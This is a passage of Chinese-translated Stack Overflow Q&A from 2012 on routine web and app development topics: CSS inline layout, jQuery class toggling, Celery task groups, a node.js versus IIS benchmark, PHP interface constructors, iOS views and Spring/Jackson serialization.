            <li><a href="#kontakti" id="kontakti">Kontakti</a></li>
        </ul>
    </div>

    <br />

    <div id="main_page">
        <div id="slide">
            slide here
        </div>

        <h1>Bylmeti</h1>
        <span>Kompania &quot;Bylmeti&quot; me seli në fshatin Miradi e Epërme komuna e Fushë Kosovës, është ndërmarrje private e themeluar me kapital privat në vitin 1996\. Veprimataria primare e kësaj ndërmarrje është: Grumbullimi i qumështit të freskët, përpunimi i qumështit dhe distribuimi i prodhimeve nga qumështi, ndërsa si veprimtari të dytë ka tregtimin dhe e prodhimeve ushqimore.</span>
    </div>

    <div id="products_page" class="hidden" style="width: 600px">
        <br />
        <div class="single_cat">
            <div class="product_cat"><br /><br /><img src="style/images/jogurtat.gif" alt="Jogurt" /></div>
            <a href="?products=yoghurts"><img src="style/images/read_more.gif" alt="readmore" /></a>
        </div>

        <div class="single_cat">
            <div class="product_cat"><br /><br /><img src="style/images/jogurtat.gif" alt="Jogurt" /></div>
            <a href="?products=yoghurts"><img src="style/images/read_more.gif" alt="readmore" /></a>
        </div>
    </div>

    <div id="refs_page" class="hidden">

    </div>

    <div id="company_page" class="hidden">
        <div class="content_nopadding">
            <h1>Historiku i kompanisë</h1>
            <span>some text.</span>
        </div>

        <br />
    </div>

    <div id="contact_page" class="hidden">
        <div class="content">
            <form action="" method="post">
            <table width="100%">
                <thead>
                <tr>
                    <th align="left">Forma e kontaktit</th>
                    <th align="left" style="padding-left: 10px; border-left: 1px solid #CCC;">Informata</th>
                </tr>
                </thead>
                <tbody>
                    <tr>
                        <td width="60%">
                            <table>
                                <tr>
                                    <td>Emri:</td>
                                    <td><input type="text" name="emri" maxlength="255" required="required" value="" /></td>
                                </tr>
                                <tr>
                                    <td>E-maili:</td>
                                    <td><input type="email" name="emaili" maxlength="255" required="required" value="" /></td>
                                </tr>
                                <tr>
                                    <td>Arsyeja:</td>
                                    <td><input type="text" name="arsyeja" maxlength="255" required="required" value="" /></td>
                                </tr>
                                <tr>
                                    <td>Mesazhi:</td>
                                    <td><textarea name="mesazhi" rows="10" cols="38" required="required"></textarea></td>
                                </tr>
                                <tr>
                                    <td><span>Kur &euml;sht&euml; formuar kompania jon&euml;?</span><br /><span class='gensmall'>P&euml;rgjegja: 1996</span></td>
                                    <td><input type="text" name="captcha_answer" maxlength="20" required="required" pattern="[A-Za-z0-9]" value="" /></td>
                                </tr>
                                <tr>
                                    <td></td>
                                    <td align="right"><input type="submit" name="dergo" class="bold" value="D&euml;rgo e-mailin" /></td>
                                </tr>
                            </table>
                        </td>
                        <td width="60%" style="padding-left: 10px; border-left: 1px solid #CCC;">
                            tesstestesttesstestesttesstestestte<br />sstestesttesstestest<br />tesstestest
                        </td>   
                    </tr>
                </tbody>
            </table>
            </form>
        </div>
    </div>
</div>
<script type="text/javascript" src="./js/jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="./js/jquery-ui-1.8.20.js"></script>
<script type="text/javascript" src="./js/core.js"></script>
</body>
</html> 
```

这是这些 div 的确切位置：

```
<div id="products_page" class="hidden" style="width: 600px">
    <br />
    <div class="single_cat">
        <div class="product_cat"><br /><br /><img src="style/images/jogurtat.gif" alt="Jogurt" /></div>
        <a href="?products=yoghurts"><img src="style/images/read_more.gif" alt="readmore" /></a>
    </div>

    <div class="single_cat">
        <div class="product_cat"><br /><br /><img src="style/images/jogurtat.gif" alt="Jogurt" /></div>
        <a href="?products=yoghurts"><img src="style/images/read_more.gif" alt="readmore" /></a>
    </div>
</div> 
```

这是CSS：

```
@font-face {
    font-family: Cocon;
    src: url('font/Cocon-Bold.otf');
}

@font-face {
    font-family: Gothic;
    src: url('font/GOTHIC.ttf');
}

:invalid {
  box-shadow: none;
}

:-moz-submit-invalid {
  box-shadow: none;
}

:-moz-ui-invalid {
  box-shadow: none;
}

body {
    margin: 0;
    color: #00a1f5;
    font-family: Gothic, sans-serif;
}

a img, a:active img, a:visited img, a, a:hover, a:active, a:visited {
    text-decoration: none;
    color: inherit;
}

h1 {
    color: #00a1f5;
    font-size: 30px;
    font-weight: bold;      
}

th {
    border-bottom: 1px solid #CCCCCC;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    font-weight: bold;
    color: #008ad2;
    padding-bottom: 5px;
    text-transform: uppercase;
    margin: 0.5em 0pt;  
}

input[type="text"], input[type="email"] {
    width: 220px;
    border: 1px solid #CCC;
    color: #666;
    font-size: 10px;
    padding: 3px 0 3px 0;
}

textarea {
    border: 1px solid #CCC;
    color: #666;
    font-size: 10px;
    font-family: Helvetica, Arial, sans-serif;
    resize: none;   
}

input[type="submit"] {
    border: 1px solid #CCC;
    color: #666;
    padding: 5px;
    cursor: pointer;
    border-radius: 4px;
    font-family: Gothic, sans-serif;
}

#bylmeti {
    width: 40%;
    position: relative;
    margin: 0 auto 0 auto;  
}

#top {
    display: inline !important;
    line-height: 0;
}

#slide {
    width: 620px;
    height: 300px;
    border: 1px solid #000;
    text-align: center;
}

#langs {
    float: right;
    padding-top: 20px;
    margin-right: -40px;
}

#logo {
    vertical-align: bottom;
    display: inline-table;
    float: left;
    width: auto;
    margin-top: -97px;
    margin-left: -60px;
}

#menu {
    width: 600px !important;
    margin-top: -40px;
    margin-left: 70px !important;
    float: left;
}

#menu ul {
    position: relative;
    overflow: hidden;
}

#menu li {
    list-style: none;   
    display: inline;
    padding-left: 5px;
    font-family: Cocon, sans-serif;
    font-size: 18px;
    text-transform: uppercase;
}

.small {
    font-size: 9px;     
}

.gensmall {
    font-size: 10px;
    font-weight: bold;
    color: #0080c2;
}

.hidden {
    display: none;  
}

.content {
    width: auto;
    min-width: 620px;
    background-color: #efefef;  
    border-radius: 15px;
    padding: 10px 25px 10px 10px;
    border: 1px solid #CCC;
}

.content_nopadding {
    width: auto;
    min-width: 620px;
    background-color: #efefef;  
    border-radius: 15px;
    padding: 0 10px 10px 10px;
    border: 1px solid #CCC;
    line-height: 1.5;
}

.header_message {
    position: fixed;
    top: 0;
    width: 99.9%;
    background-color: #0080c2;
    border-bottom: 2px dotted #006aa2;  
    color: #FFF;
    text-align: center;
    font-size: 12px;
    padding: 3px 0 3px 0;
    font-weight: bold;
    z-index: 200;
    border-radius: 0 0 10px 10px;
    font-family: Gothic, sans-serif;
}

.bold {
    font-weight: bold;  
}

.single_cat {
    display: inline;    
}

.product_cat {
    width: 212px;
    height: 200px;
    border-top: 1px solid #caeeff;
    border-right: 1px solid #caeeff;    
    border-left: 1px solid #caeeff;
    border-radius: 20px 20px 0 0;
    text-align: center;
} 
```

知道如何内联显示这些正方形吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:00:05.400

尝试`display: inline-block`：

```
#products_page {
    font-size: 0;
}

#products_page > .single_cat {
    display: inline-block;
    font-size: 12px;
    width: 300px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T13:48:34.560

而不是`display:inline;`尝试添加`float:left;`到您的`.product_cat`或`.single_cat`css 定义（[w3schools-float](http://www.w3schools.com/cssref/pr_class_float.asp) ）

# jquery - 在复选框图像之间切换 - 但更容易

> ID：13271055
> 
> 赞同：0
> 
> 时间：2012-11-07T13:45:37.407
> 
> 标签：jquery, toggle

我有两个选中和未选中复选框的小图像。

我的代码正在运行，但我认为使用 .toggle() 可能会更短？直到现在我才弄清楚，这是代码：

```
$('.uncheck').click(function() {
    $(this).removeClass('uncheck').addClass('checked');
});
$('.checked').click(function() {
    $(this).removeClass('checked').addClass('uncheck');
}); 
```

这里有任何 jQuery 大师吗？;)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T14:21:02.703

如果您确定，该元素只有一个类，您可以通过用逗号分隔它们来为每个绑定绑定两个类的处理程序。并使用 toggleClass

```
$('.uncheck,.checked').click(function() {
    $(this).toggleClass('uncheck checked');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T13:45:14.013

看看这个小提琴 - [http://jsfiddle.net/3XhbW/1/](http://jsfiddle.net/3XhbW/1/)

HTML -

```
<div class="checked unchecked">Test Text</div> 
```

CSS - （注意如何检查未检查的覆盖）

```
 .checked {
    color: #FFFFFF;
    background: #0000FF;
}
.unchecked {
    color: #000000;
    background: #00FF00;
} 
```

jQuery - 首先切换未选中的类“关闭”

```
$('div').click(function() {
    $(this).toggleClass('unchecked');
    var myCurrentClasses = $(this).attr('class');
    $(this).html(myCurrentClasses);
}); 
```

我只是在第一次单击后将类信息发布到 div 以便您可以看到当前 div 具有哪些类。

# python - 如何将返回列表的芹菜任务链接到组中？

> ID：13271056
> 
> 赞同：32
> 
> 时间：2012-11-07T13:45:39.107
> 
> 标签：python, celery

我想从 Celery 任务返回的列表中创建一个组，这样对于任务结果集中的每个项目，都会将一个任务添加到组中。

这是一个解释用例的简单代码示例。`???`应该是上一个任务的结果。

```
@celery.task
def get_list(amount):
    # In reality, fetch a list of items from a db
    return [i for i in range(amount)]

@celery.task
def process_item(item):
    #do stuff
    pass

process_list = (get_list.s(10) | group(process_item.s(i) for i in ???)) 
```

我可能没有正确处理这个问题，但我很确定从任务中调用任务是不安全的：

```
@celery.task
def process_list():
    for i in get_list.delay().get():
        process_item.delay(i) 
```

我不需要秒任务的结果。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-11-26T17:20:55.330

您可以使用中间任务获得这种行为。这是创建类似于您建议的“地图”方法的演示。

```
from celery import task, subtask, group

@task
def get_list(amount):
    return [i for i in range(amount)]

@task
def process_item(item):
    # do stuff
    pass

@task
def dmap(it, callback):
    # Map a callback over an iterator and return as a group
    callback = subtask(callback)
    return group(callback.clone([arg,]) for arg in it)()

# runs process_item for each item in the return of get_list 
process_list = (get_list.s(10) | dmap.s(process_item.s())) 
```

感谢 Ask Solem 在我就类似问题向他寻求帮助时给了我这个建议。

# linux - node.js 与 IIS 7.5 性能对比

> ID：13271057
> 
> 赞同：4
> 
> 时间：2012-11-07T13:45:40.210
> 
> 标签：linux, performance, node.js, iis

## 设置：

EC2 上的 2 台机器，类型为 m3.xlarge。

第一个使用 ubuntu 服务器。

第二个win2008r2。

ubuntu 上的 node.js 使用基本示例返回对任何请求的字符串响应。

asp.net httphandler 返回相同的响应。

使用[https://github.com/newsapps/beeswithmachineguns](https://github.com/newsapps/beeswithmachineguns) 我使用 10 台机器执行 200000 并发 2000（每台机器 200）我运行基准测试并得到：

## 节点JS：

```
 Complete requests:         200000

 Requests per second:       5605.170000 [#/sec] (mean)

 Time per request:          358.071900 [ms] (mean)

 50% response time:         31.000000 [ms] (mean)

 90% response time:         239.300000 [ms] (mean) 
```

## IIS：

```
 Complete requests:         200000

 Requests per second:       9263.810000 [#/sec] (mean)

 Time per request:          215.992900 [ms] (mean)

 50% response time:         214.000000 [ms] (mean)

 90% response time:         244.000000 [ms] (mean) 
```

nodeJS代码是：

```
http.createServer(function (request, response) {
  response.writeHead(200, {'Content-Type': 'text/plain'});
  response.end('Some response\n');
}).listen(80); 
```

httphandler 代码是：

```
context.Response.Write("Some response\n" + Guid.NewGuid().ToString("N")); 
```

我以为node js会快很多，是我做错了吗？

## 编辑：

使用集群模块后，我每秒从节点 js 收到 16685 个请求，我将调出最强的 EC2 实例并检查它们

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:01:06.150

一个 m3.xlarge 实例有几个 cpu 核心，而 node.js 是单线程的。您可以尝试对[node.js 集群模块](http://nodejs.org/api/cluster.html)进行基准测试，看看使用更多 CPU 是否有帮助。而且，由于 node.js 相当新，请确保使用最新的稳定系列（撰写本文时为 0.8.x）。

# ios - 将 Flash 视频播放到原生 iOS 应用程序中... iOS6 测试

> ID：13271059
> 
> 赞同：0
> 
> 时间：2012-11-07T13:45:41.317
> 
> 标签：ios, video, flash, playback

我想知道（我事先知道这已经讨论过很多次了）是否有一种新的/更新的方式可以将 Flash 视频播放到原生 iOS 应用程序中……iOS6 测试。

没什么大不了的...只是一个按钮...可以播放 Flash（flv、swf 或建议的）并返回视图，就像我使用 mov 文件一样。

If (!Possible) 大师们现在正在重新使用哪个框架或库？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T13:50:31.013

**不。**

没有可用于 iOS、开发目的或其他目的的**原生Flash 播放器。**

有云解决方案 ( [AppsVerse](http://www.appsverse.com/Index) ) 或允许从 Web 播放 Flash 视频的代理 ( [SkyFire](http://www.skyfire.com/) )，但没有本地库。

# javascript - 如何获得位置固定的元素高度？

> ID：13271060
> 
> 赞同：0
> 
> 时间：2012-11-07T13:45:41.243
> 
> 标签：javascript, jquery, html, css

如何获得位置固定的元素的高度？

**代码：**

```
elm.outerHeight(true) 
```

当位置设置为固定时，此代码将返回 0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T13:48:26.060

您也可以简单地使用`.height()`固定位置元素，如：

```
var h = $('div').height(); 
```

**演示： http:** [//jsfiddle.net/C2s8T/](http://jsfiddle.net/C2s8T/) - 适用于 FF 和 Chrome

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T13:49:19.677

你可以试试这个：

```
 getComputedStyle(div).position 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-07T13:47:11.693

您可以使用[jQuery.offset();](http://api.jquery.com/offset/) 为了这。

喜欢`$("div.container").offset().top;`或`$("div.container").offset().left;`

# javascript - 在客户端将大文件 (> 2GB) 压缩成 ZIP

> ID：13271061
> 
> 赞同：11
> 
> 时间：2012-11-07T13:45:43.880
> 
> 标签：javascript, html, node.js, upload, compression

`node.js`我正在使用and构建一个上传工具`socket.io`，因为它们通常会上传非常大的文件，而普通的上传表单不起作用。问题是他们想在发送之前将文件压缩成 zip，以提高传输效率。

我一直在研究诸如[JSZip](http://stuartk.com/jszip/)或[zip.js 之](http://gildas-lormeau.github.com/zip.js/)类的压缩方法，但这些方法都不适用于非常大的文件。我能做什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-15T20:29:11.213

[您可以使用zip.js](http://gildas-lormeau.github.com/zip.js/)压缩多达 4GB 的数据，但是：

*   它仅适用于 Chrome
*   它会很慢（我的旧笔记本电脑上每 GB 压缩数据大约需要 30 分钟）

您可以通过[此演示](http://gildas-lormeau.github.com/zip.js/demos/demo1.html)在线试用。您必须在“选择临时存储”输入中选择“HDD”选项。然后你可以从你的文件系统中导入大文件并监控内存消耗：它应该是稳定的（在我的笔记本电脑上大约 300MB）。

选择“HDD”意味着 zip.js 将使用[File API: Directories and System](http://www.w3.org/TR/file-system-api/)来存储压缩数据。此 API 目前仅在 Chrome 上可用，并允许将数据写入沙盒虚拟文件系统。该演示使用不需要用户权限的临时存储。

编辑：您还可以实现自己的[Writer 构造](http://gildas-lormeau.github.com/zip.js/core-api.html#zip-writer)函数，以便在 zip.js 压缩数据时将数据流式传输到服务器：它不依赖于文件系统 API，并且应该适用于您支持的每个浏览器。Writer 必须只实现以下两种方法：

```
init(callback[, onerror])
// initializes the stream where to write the zipped data

writeUint8Array(array, callback[, onerror])
// writes asynchronously a Uint8Array into the stream.

// getData method is optional 
```

这是自定义 Writer 和 Reader 构造函数[的示例](https://github.com/gildas-lormeau/zip.js/issues/21#issuecomment-9889885)。您还可以查看[zip.js 编写器实现](https://github.com/gildas-lormeau/zip.js/blob/f4b6ffbe0b1a503730e9a5b20eda287812b9df87/WebContent/zip.js#L279-401)以获取更多示例。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T13:57:11.943

如果您正在客户端寻找压缩器，我很遗憾地告诉您，JS 不是要走的路。

另一方面，您最好的选择是告诉您的用户在上传文件之前只压缩文件。或者甚至使用其他类型的工具（也许是 FTP？）。

编辑：

哦，顺便说一句，ZIP 对于随机数据确实效率低下，因此您将浪费 CPU 时间进行压缩/解压缩，并且几乎不会缩小任何大小。

# ios - UIImageview 不会在 superview 中居中

> ID：13271062
> 
> 赞同：6
> 
> 时间：2012-11-07T13:45:56.073
> 
> 标签：ios, uiimageview, center, subview

我有一个 UIImageView，我将它添加到 UIView 以增强识别触摸的区域。当我尝试将 UIImageView 在 UIView 中居中时（下面的代码），中心设置正确，但是当我运行程序时，图像显示在 UIView 框架之外。

有任何想法吗？

```
// image size is 32x32 pixels but view will be created with 44x44 so touch recognition is better
self = [super initWithFrame:CGRectMake(position.x, position.y, 44, 44)];

if (self) {
    switch (color) {
        case Blue:
            self.imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"pin_red"]];
            break;
        case Green:
            self.imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"pin_green"]];
        default:
            break;
    }

    [self setCenter:position];
    [self addSubview:self.imageView];
    [self setExclusiveTouch:YES];        
    [self setBackgroundColor:[UIColor clearColor]];

    [self.imageView setCenter:position];

    NSLog(@"uiview center: %@", NSStringFromCGPoint(self.center));
    NSLog(@"image center: %@", NSStringFromCGPoint(self.imageView.center)); 
```

谢谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-07T13:53:11.287

imageview setCenter 是相对于它的父级的。尝试：

```
[self.imageView setCenter:CGPointMake(self.bounds.size.width/2, self.bounds.size.height/2)]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-05-28T14:41:03.817

```
UIImageView *imageforFace=[[UIImageView alloc]initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2,[UIScreen mainScreen].bounds.size.height/2, 125,125)];
imageforFace.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin|UIViewAutoresizingFlexibleRightMargin;
[imageforFace setCenter:CGPointMake(self.view.bounds.size.width/2, self.view.bounds.size.height/2)];
imageforFace.image=[UIImage imageNamed:@"face.png"];
[self.view addSubview:imageforFace]; 
```

**最终输出是**

![在此处输入图像描述](../Images/706580fa290eac1d6d9de602b2745397.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-02T13:33:26.203

**试试这段代码给*UIView 的 UIImageView Frame Center***

**1) 在 .h 文件中**

```
UIImageView *imgCenter; 
```

**2) 在 .m 文件中**

```
- (void)viewDidLoad
{
    imgCenter=[[UIImageView alloc]initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width / 2, [UIScreen mainScreen].bounds.size.height / 2, 35, 35)];
    [imgCenter setImage:[UIImage imageNamed:@"centerImage.png"]];
    [self.view addSubview:imgCenter];
} 
```

**或者**

```
- (void)viewDidLoad
{
    imgCenter=[[UIImageView alloc]initWithFrame:CGRectMake(0, 0, 35, 35)];
    imgCenter.center = self.view.center;
    [imgCenter setImage:[UIImage imageNamed:@"centerImage.png"]];
    [self.view addSubview:imgCenter];
} 
```

# c# - 显示（名称）和显示名称之间的区别

> ID：13271067
> 
> 赞同：4
> 
> 时间：2012-11-07T13:46:08.903
> 
> 标签：c#, asp.net-mvc

> **可能重复：显示名称**
> [属性与显示属性](https://stackoverflow.com/questions/5243665/displayname-attribute-vs-display-attribute)

两者之间有什么区别`Display(Name="MyName")`， `DisplayName("MyName")`或者它只是 ASP.NET MVC 的一个特性吗？我说的是命名空间**System.ComponentModel.DataAnnotations**。

# php - 接口或类中的 PHP 类构造函数

> ID：13271068
> 
> 赞同：15
> 
> 时间：2012-11-07T13:46:16.143
> 
> 标签：php, oop, class, interface

我在想出一个好的结构来构建我的类和对象时遇到了一些问题。在下面的代码中，我使用一个接口来定义我的类方法，但我还想将一个数据库连接传递给我的构造函数，以便类可以使用这个连接。当我在下面编码时将构造函数放置在我的类中和我的接口中的方法是否正确？

```
interface IDataItem
{
    public function saveItem(Item $theItem);
}

class DataItem implements IDataItem
{
    public function __construct(Database $database) 
    { 
        $this->database = $database;
    }

    public function saveItem(Item $item) 
    {       
        //save the item
    }
}

$db = new Database(); //from a database class
$dataItem = new DataItem($db);          
$dataItem->saveItem($anItem); 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-07T14:06:35.757

虽然在技术上可以将构造函数添加到接口，但接口不应定义构造函数，因为那将是实现类的实现细节。接口应该只定义其他协作者可以调用的公共 API。也就是说，他们不应该强制执行特定的实现。

如果您在接口中放置一个请求数据库连接的构造函数，您会将具体类限制为构造函数签名中的依赖项。如果实现接口的具体类需要不同的（因为它保存到 Web 服务）或额外的（可能是记录器）依赖项，则您无法使其与您的接口一起使用。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-07T13:50:29.937

我个人认为您不应该将构造函数放在接口中，因为您永远不会通过调用构造函数来创建新对象而不知道您正在使用哪个实现。

你的代码有错误，接口中的方法不能有实现，它需要只是一个声明，像这样

```
interface IDataItem
{
    public function saveItem($theItem);
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2016-06-15T00:36:25.927

这有点离题了，但我认为它强调了在接口中定义构造函数可能有用的情况。

可以在不知道其类的情况下实例化对象。这是一个简单的例子：

```
interface Animal
{
    public function __construct($name);
    public function speak();
    public function getName();
}

class Cat implements Animal
{
    protected $name=null;
    public function __construct($name){ $this->name=$name; }
    public function speak(){ echo 'meow'; }
    public function getName(){ return $this->name;}
}

class Dog implements Animal
{
    protected $name=null;
    public function __construct($name){ $this->name=$name; }
    public function speak(){ echo 'woof'; }
    public function getName(){ return $this->name;}
}

$animals=Array(array('name'=>'Felix','type'=>'Cat'),array('name'=>'Fido','type'=>'Dog'));

foreach($animals as $a)
{
    $theAnimal=new $a['type']($a['name']);
    echo '<p>speak, '.$theAnimal->getName().'</p><p>';
    $theAnimal->speak();
    echo '</p>';
} 
```

我已经使用这样的东西进行 url 路由，以将 url 与其顶级控制器匹配。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-11-06T09:58:20.533

根据 PHP 文档：

“请注意，可以在接口中声明构造函数，这在某些情况下可能很有用，例如供工厂使用。”

关键是构造函数不必用具体类定义，但可以用接口定义，例如：

```
interface TestInterface {
    public function __construct(interfaceA, interfaceB);
} 
```

然后实现TestInterface的类用interfaceA和interfaceB的具体实现来定义它的构造函数：

```
class Test implements TestInterface {
    public function __construct(testA, testB);
} 
```

其中 testA 可能类似于：

```
class testA implements interfaceA {
    public function doStuff() {
        //...
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-07T13:49:00.720

接口只是强制执行可能不相关的类都将实现相同方法的契约。

由于在构造时必须明确知道类，所以将构造函数放在接口中是没有用的。你永远不会通过接口调用构造函数。您当前的解决方案是正确的。

* * *

## 回答 #6

> 赞同：-3
> 
> 时间：2012-11-07T13:48:32.720

创建一个变量来保存类中的数据库句柄。

# .htaccess - 如何将 .htaccess 与目录的子目录一起使用

> ID：13271071
> 
> 赞同：1
> 
> 时间：2012-11-07T13:46:25.980
> 
> 标签：.htaccess, mod-rewrite

假设我有以下代码：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^([^/\.]+)/?$ controller.php?request=$1 [L,QSA] 
```

如果我转到文件夹/子文件夹/之类的文件夹，它会给我一个 404 错误，尽管该文件夹存在。

我怎样才能使它与子目录一起工作？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T16:25:10.940

尝试将规则中的模式从`^([^/\.]+)/?$`to更改为`^([^\.]+)/?$`与斜杠匹配。

# php - sqlsrv 在 php 5.4 的窗口中挂起

> ID：13271075
> 
> 赞同：3
> 
> 时间：2012-11-07T13:46:44.160
> 
> 标签：php, sql-server, iis, windows-server-2003, php-extension

我知道这被问了很多次，但所有的答案都已经过时了。

从 PHP 5.3 开始，我们都知道**不**支持 mssql，因此继续为此安装 Microsoft 的[sqlsrv](http://www.microsoft.com/en-us/download/details.aspx?id=20098) 驱动程序，因为它似乎是唯一的选择（我愿意接受建议！）。

现在我在 Windows server 2003、SQL Server 2005 上使用 PHP 5.4 和 IIS 作为网络服务器。

我已经遵循了大约一百万个指南，并且我已经相应地安装了所有内容，但是驱动程序无法加载，`sqlsrv`不会显示`phpinfo()`或挂起。

这就是我在 php.ini 中所做的：

```
 extension=php_sqlsrv_54_nts.dll 
```

并且`extension_dir`设置为`C:\PHP\ext`，尽管 phpinfo() 显示它从 progrem 文件加载 php.ini 文件，所以我每次都在编辑 2 个 php.ini 文件，因为我不确定哪个是活动的。出于同样的原因，我将 dll 文件放在两个位置。

没有关于这个问题的信息！所有解决方案都适用于使用错误版本等的人。

我已经尝试应用每个 dll 并且所有的结果都相同，包括线程和非线程。

我能做些什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T20:40:39.683

我看到您使用的是 Windows Server 2003。您需要将 PHP 2.0 版用于 SQL Server 驱动程序和 Windows Server 2003。您不能使用最新的 3.0 版驱动程序。

但是，您需要 3.0 版的“用于 SQL Server 驱动程序的 PHP”才能使用 PHP 5.4+。

Basically you need to update your OS to Windows Server 2008 in order to use PHP 5.4+ (if you want SQL Server driver support).

[http://msdn.microsoft.com/en-us/library/cc296170.aspx](http://msdn.microsoft.com/en-us/library/cc296170.aspx)

I know this is an old question, but it was one of the first results when I was looking for information earlier today.

# jquery - Spring MVC 使用 Jackson 返回 ajax 响应

> ID：13271077
> 
> 赞同：0
> 
> 时间：2012-11-07T13:46:47.243
> 
> 标签：jquery, json, spring-mvc, jackson

我有一个场景，我通过来自服务器的 AJAX 响应填充 JSP 中的下拉框。在控制器中，我正在重新调整 Product 对象的集合，并使用 @ResponseBody 注释了返回类型。

控制器 -

```
@RequestMapping(value="/getServicesForMarket", method = RequestMethod.GET)
public @ResponseBody Collection<Product> getServices(@RequestParam(value="marketId", required=true) int marketId) {
    Collection<Product> products = marketService.getProducts(marketId);
    return products;
} 
```

产品是

```
@Entity
@Table(name = "PRODUCT")
public class Product implements Serializable {

    private static final long serialVersionUID = 1L;

    private int id;

    private Market market;

    private Service service;

    private int price;

    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    @ManyToOne(fetch=FetchType.LAZY)
    @JoinColumn(name = "MARKET_ID")
    public Market getMarket() {
        return market;
    }

    public void setMarket(Market market) {
        this.market = market;
    }

    @ManyToOne(fetch=FetchType.LAZY)
    @JoinColumn(name = "SERVICE_ID")
    public Service getService() {
        return service;
    }

    public void setService(Service service) {
        this.service = service;
    }

    @Column(name = "PRICE")
    public int getPrice() {
        return price;
    }

    public void setPrice(int price) {
        this.price = price;
    }
} 
```

服务是

```
@Entity
@Table(name="SERVICE")
public class Service implements Serializable {

    /**
     * 
     */
    private static final long serialVersionUID = 1L;

    private int id;

    private String name;

    private String description;

    @Id
    @GeneratedValue
    @Column(name="ID")
    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    @Column(name="NAME")
    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Column(name="DESCRIPTION")
    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description;
    }
} 
```

在 JSP 中，我还需要从 Product 的服务字段中获取数据。所以我在我的 JQuery 回调函数中，我写了类似 product.service.description 来获取数据。

似乎默认情况下杰克逊没有映射关联的服务对象（或任何其他自定义对象）。我也没有任何例外。在 JSP 中，我没有得到数据。当我返回某个不包含任何其他自定义对象作为其字段的对象的集合时，它工作正常。

我是否缺少任何设置以使其正常工作？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:58:22.780

我建议对[jackson](https://github.com/FasterXML/jackson-module-hibernate)使用休眠模块，这将帮助您忽略休眠未初始化的对象。这样你就不会有异常，只有完全初始化的转换。

# iphone - 推送的 segue 场景有效，模态的 segue 场景不行？

> ID：13271078
> 
> 赞同：0
> 
> 时间：2012-11-07T13:46:48.850
> 
> 标签：iphone, objective-c, ios, xcode

我手动调用了一个很好的推送序列。新的 TableView 场景出现了，导航控制器中的自定义导航按钮完美运行。

但是，我希望它成为模态转场。因此，我将类型更改为模态并将新场景嵌入到导航控制器中。新场景出现，但是当点击取消按钮时场景不会消失。

任何想法为什么？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T13:58:15.630

**Push** segue 将一个新的视图控制器添加到导航堆栈中，其中还包含呈现视图控制器。这就是导航栏在这种情况下起作用的原因。

**Modal** segue 不会将视图控制器添加到导航堆栈，它会将其添加为呈现视图控制器的子级，因此在这种情况下没有定义导航。

如果您希望导航栏在模态呈现的控制器上工作，您将不得不手动连接操作（例如：使“返回”按钮关闭模态呈现的控制器）。

此外，正如@Edwin Iskandar 所指出的，确保在视图控制器上调用正确的关闭操作，这意味着：`popViewControllerAnimated`不会在模态呈现的视图控制器上工作，而是应该调用`dismissModalViewControllerAnimated`

**PS：**注意，iOS 6`dismissModalViewControllerAnimated`已弃用`dismissViewControllerAnimated:(BOOL) completion:^(void)completion`

# cordova - Jquerymobile/Phonegap/iOS 页脚导航栏在第一次滚动时不固定

> ID：13271082
> 
> 赞同：3
> 
> 时间：2012-11-07T13:47:03.190
> 
> 标签：cordova, jquery-mobile

我有一个多页 Jquerymobile 1.2 文件。当我导航到需要滚动的页面时，页脚不再固定，而是在第一个滚动时跳转。当我松开手指时，页脚会跳回原位。当我在多页文档中的任何其他页面上重复该过程并随后滚动时，不再出现此效果。

这是页脚的代码 - 这用于多页文档中的所有页面（请注意，它也链接到几个外部文件）：

```
<div data-role="footer" class="nav-rp" data-theme="a" data-position="fixed" data-id="myfooter">
    <div data-role="navbar" class="nav-rp" >
        <ul>
            <li><a rel="external" href="index.html#index"  class="icon-index" data-icon="custom">Home</a></li>
            <li><a rel="external" href="index.html#route-1" class="icon-route" data-icon="custom">Route</a></li>
            <li><a rel="external" href="gallery.html" class="icon-gallery" data-icon="custom">Gallery</a></li>
            <li><a href="businesses.html" rel="external" class="icon-business" data-icon="custom">Business</a></li>
        </ul>
    </div>
</div> 
```

任何指导将不胜感激。

* * *

## 回答 #1

